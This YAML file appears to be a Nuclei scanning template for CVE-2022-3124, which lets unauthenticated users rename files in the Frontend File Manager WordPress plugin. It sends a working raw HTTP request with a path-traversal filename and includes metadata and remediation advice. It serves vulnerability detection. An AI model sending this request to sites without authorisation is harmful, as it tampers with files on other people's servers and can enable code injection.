http:
- matchers:
  - condition: and
    part: body
    regex:
    - '"fileid"\s*:\s*"([^"]+)"'
    - '"filename"\s*:\s*"([^"]+)"'
    type: regex
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-json/wpfm/v1/file-rename HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    fileid=1&filename=../../../../{{rand_string}}.php

    '
id: CVE-2022-3124
info:
  author: riteshs4hu
  classification:
    cpe: cpe:2.3:a:najeebmedia:frontend_file_manager:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-3124
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
    cwe-id: CWE-862
    epss-percentile: 0.91493
    epss-score: 0.07544
  description: 'The Frontend File Manager Plugin WordPress plugin before 21.3 allows
    any unauthenticated user to rename uploaded files from users. Furthermore, due
    to the lack of validation in the destination filename, this could allow allow
    them to change the content of arbitrary files on the web server

    '
  impact: 'Unauthenticated attackers can rename uploaded files and manipulate arbitrary
    file content on the web server through path traversal, potentially overwriting
    critical WordPress files or injecting malicious code.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: frontend_file_manager
    publicwww-query: /wp-content/plugins/nmedia-user-file-uploader/
    vendor: najeebmedia
    verified: true
  name: Frontend File Manager < 21.3 - Unauthenticated File Renaming
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2022-3124
  - https://wpscan.com/vulnerability/00f76765-95af-4dbc-8c37-f1b15a0e8608/
  remediation: 'Update Frontend File Manager plugin to version 21.3 or later that
    validates file rename operations and restricts them to authenticated users with
    proper path validation.

    '
  severity: medium
  tags: cve,cve2022,wordpress,wp-plugin,wpscan,nmedia-user-file-uploader,file-upload,intrusive,vkev,vuln
variables:
  rand_string: '{{to_lower(rand_text_alpha(6))}}'
